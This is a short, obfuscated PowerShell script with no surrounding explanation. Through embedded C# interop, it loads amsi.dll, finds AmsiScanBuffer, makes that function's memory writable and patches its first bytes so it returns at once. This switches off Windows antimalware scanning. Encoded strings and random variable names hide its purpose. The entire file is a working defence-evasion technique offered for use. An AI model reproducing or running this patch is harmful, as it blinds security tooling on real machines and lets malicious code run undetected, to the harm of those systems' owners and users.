$UhFu94 = @"
using System;
using System.Runtime.InteropServices;
public class UhFu94 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr FtoaPuPH6GL1JOg, string Qu9hsLXbkhvmV1z);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr zKA_ukvRl, UIntPtr BZJ4oAjvzOObq1eo, uint vAn7zZh5, out uint ssk0ji35);
}
"@

Add-Type $UhFu94

$mp9_tGykFTVrzNJPYX = [UhFu94]::LoadLibrary("$([chaR](97)+[cHAr](109+95-95)+[chAR](115)+[CHaR](105*46/46)+[Char](46*25/25)+[ChAR](100)+[cHAR](108+92-92)+[ChAr]([byTE]0x6c))")
$bGTXDu9ydOStFfgO = [UhFu94]::GetProcAddress($mp9_tGykFTVrzNJPYX, "$([ChaR](65)+[chaR]([byTe]0x6d)+[chAR](99+16)+[CHAR](105)+[chAR](39+44)+[char](99)+[cHAR](97)+[char](110)+[cHaR](66*11/11)+[Char]([BYtE]0x75)+[char]([Byte]0x66)+[ChAr](57+45)+[ChAR](101*29/29)+[cHAr]([bYTe]0x72))")
$p = 0
[UhFu94]::VirtualProtect($bGTXDu9ydOStFfgO, [uint32]5, 0x40, [ref]$p)
$UkKlD_Ns7KK6Wnls = "0xB8"
$qSIrU = "0x57"
$qCkWDravRF01ALKCnDfN = "0x00"
$masGrPlJxA2wM = "0x07"
$Qbrb2BunmClrqfQs = "0x80"
$dRoed3gbR4ICKh2oxdN = "0xC3"
$lTLYNQTsKmrv5KqI = [Byte[]] ($UkKlD_Ns7KK6Wnls,$qSIrU,$qCkWDravRF01ALKCnDfN,$masGrPlJxA2wM,+$Qbrb2BunmClrqfQs,+$dRoed3gbR4ICKh2oxdN)
[System.Runtime.InteropServices.Marshal]::Copy($lTLYNQTsKmrv5KqI, 0, $bGTXDu9ydOStFfgO, 6)